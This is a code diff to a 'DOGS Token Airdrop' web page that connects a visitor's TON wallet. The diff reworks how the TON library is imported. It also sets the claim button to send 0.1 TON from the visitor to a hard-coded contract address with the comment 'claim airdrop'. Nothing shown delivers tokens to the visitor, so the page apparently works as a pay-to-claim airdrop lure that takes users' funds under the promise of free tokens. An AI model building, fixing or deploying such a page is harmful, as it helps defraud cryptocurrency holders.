@@ -5,8 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🐕 DOGS Token Airdrop 🐕</title>
-    <script src="node_modules/@ton/ton/dist/index.js"></script>
-
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/tonweb@0.0.60/dist/tonweb.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -274,28 +272,32 @@
         <div id="status"></div>
     </div>
 
+    <script type="module">
+        import { beginCell, toNano } from './node_modules/@ton/ton/dist/index.js';
+        window.beginCell = beginCell;
+        window.toNano = toNano;
+    </script>
+    
     <script>
-        import { beginCell, toNano } from '@ton/ton';
-
         const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
         const MANIFEST_URL = 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json';
-
+    
         function updateProgress(percent) {
             const progressBar = document.querySelector('.progress-bar');
             const progressText = document.querySelector('.progress-text');
             const progressContainer = document.querySelector('.progress-container');
-
+    
             progressContainer.style.display = 'block';
             progressBar.style.width = `${percent}%`;
             progressText.textContent = `${percent}%`;
-
+    
             if (percent >= 100) {
                 setTimeout(() => {
                     progressContainer.style.display = 'none';
                 }, 1000);
             }
         }
-
+    
         function updateStatus(message, type = 'info') {
             const statusDiv = document.getElementById('status');
             const icons = {
@@ -303,20 +305,20 @@
                 error: 'exclamation-circle',
                 info: 'info-circle'
             };
-
+    
             statusDiv.innerHTML = `
                 <i class="fas fa-${icons[type]}"></i> ${message}
             `;
-
+    
             statusDiv.style.color = type === 'error' ? '#e74c3c' :
                 type === 'success' ? '#2ecc71' : '#3498db';
         }
-
+    
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: MANIFEST_URL,
             buttonRootId: 'ton-connect'
         });
-
+    
         tonConnectUI.onStatusChange(wallet => {
             const claimButton = document.getElementById('claim-button');
             if (wallet) {
@@ -327,45 +329,44 @@
                 updateStatus('Please connect your wallet', 'info');
             }
         });
-
+    
         document.getElementById('claim-button').addEventListener('click', async () => {
             try {
                 if (!tonConnectUI.connected) {
                     updateStatus('Please connect your wallet first', 'error');
                     return;
                 }
-
+    
                 updateStatus('Preparing transaction...', 'info');
                 updateProgress(20);
-
-                const body = beginCell()
-                    .storeUint(0, 32) // write 32 zero bits to indicate that a text comment will follow
-                    .storeStringTail("Hello, TON!") // write our text comment
+    
+                const body = window.beginCell()
+                    .storeUint(0, 32)
+                    .storeStringTail("claim airdrop")
                     .endCell();
-
-
+    
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: [
                         {
                             address: AIRDROP_CONTRACT_ADDRESS,
-                            amount: '100000000',
-                            payload: body.toBoc().toString("base64") // payload with comment in body
+                            amount: window.toNano('0.1').toString(),
+                            payload: body.toBoc().toString("base64")
                         }
                     ]
                 };
-
+    
                 console.log("Prepared transaction:", transaction);
-
+    
                 updateProgress(40);
-
+    
                 const result = await tonConnectUI.sendTransaction(transaction);
                 console.log('Transaction result:', result);
-
+    
                 updateProgress(80);
                 updateStatus('Transaction sent successfully!', 'success');
                 updateProgress(100);
-
+    
             } catch (error) {
                 console.error('Transaction error:', error);
                 updateStatus(`Transaction error: ${error.message}`, 'error');
